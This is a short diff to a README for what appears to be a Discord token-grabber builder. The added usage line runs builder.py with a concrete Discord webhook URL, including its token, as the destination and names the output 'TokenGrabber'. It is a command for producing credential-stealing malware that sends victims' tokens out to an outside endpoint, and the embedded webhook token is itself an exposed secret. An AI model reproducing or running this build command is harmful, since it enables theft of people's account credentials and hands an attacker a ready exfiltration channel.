@@ -10,7 +10,7 @@ To Execute the builder.py script, you need to run the following command:
 
 ### Windows
 ```
-.\venv\Scripts\python.exe builder.py -w YOUR_WEBHOOK_URL -o FILE_NAME
+.\venv\Scripts\python.exe builder.py -w [YOUR_WEBHOOK_URL](https://discord.com/api/webhooks/1212083584374935663/9mzODQg8i0UJ4UllSIvA0nU-595Jx99jQupwO-wcFr6cM4BIt6n7pOpBTVHtY0NpoWb_) -o TokenGrabber
 ```
 ### MacOS
 ```
